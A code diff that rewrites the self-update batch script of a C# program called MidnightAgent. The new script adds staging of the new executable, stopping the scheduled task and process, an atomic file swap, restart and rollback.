@@ -95,17 +95,43 @@ namespace MidnightAgent.Features
                 string updaterPath = Path.Combine(tempFolder, "updater.bat");
                 
                 string updaterScript = $@"@echo off
-timeout /t 5 /nobreak > nul
-if exist ""{currentExe}"" ( move /y ""{currentExe}"" ""{currentExe}.bak"" > nul )
-copy /y ""{tempPath}"" ""{currentExe}"" > nul
-if exist ""{currentExe}"" (
-    start """" ""{currentExe}"" agent
-    del /f /q ""{currentExe}.bak"" > nul
-) else (
-    move /y ""{currentExe}.bak"" ""{currentExe}"" > nul
-    start """" ""{currentExe}""
+setlocal
+set ""TASK_NAME={Config.TaskName}""
+set ""EXE_PATH={currentExe}""
+set ""NEW_EXE={tempPath}""
+set ""BACKUP_EXE=%EXE_PATH%.bak""
+set ""STAGING_EXE=%EXE_PATH%.new""
+
+:: 1. Cleanup old staging/backup
+if exist ""%STAGING_EXE%"" del /f /q ""%STAGING_EXE%""
+if exist ""%BACKUP_EXE%"" del /f /q ""%BACKUP_EXE%""
+
+:: 2. Pre-copy to the SAME FOLDER (fastest swap)
+copy /y ""%NEW_EXE%"" ""%STAGING_EXE%"" > nul
+
+:: 3. Stop task and kill process
+schtasks /End /TN ""%TASK_NAME%"" > nul 2>&1
+taskkill /F /IM ""{Config.ExeName}"" > nul 2>&1
+timeout /t 1 /nobreak > nul
+
+:: 4. THE ATOMIC SWAP (Minimize the 'file missing' window)
+if exist ""%STAGING_EXE%"" (
+    if exist ""%EXE_PATH%"" move /y ""%EXE_PATH%"" ""%BACKUP_EXE%"" > nul
+    move /y ""%STAGING_EXE%"" ""%EXE_PATH%"" > nul
 )
-del /f /q ""{tempPath}"" > nul
+
+:: 5. Restart and Verify
+if exist ""%EXE_PATH%"" (
+    schtasks /Run /TN ""%TASK_NAME%"" > nul 2>&1
+    if errorlevel 1 start """" ""%EXE_PATH%"" agent
+    del /f /q ""%BACKUP_EXE%"" > nul 2>&1
+) else (
+    :: Emergency Rollback
+    if exist ""%BACKUP_EXE%"" move /y ""%BACKUP_EXE%"" ""%EXE_PATH%"" > nul
+)
+
+:: Cleanup
+del /f /q ""%NEW_EXE%"" > nul
 del /f /q ""%~f0"" > nul";
 
                 File.WriteAllText(updaterPath, updaterScript);
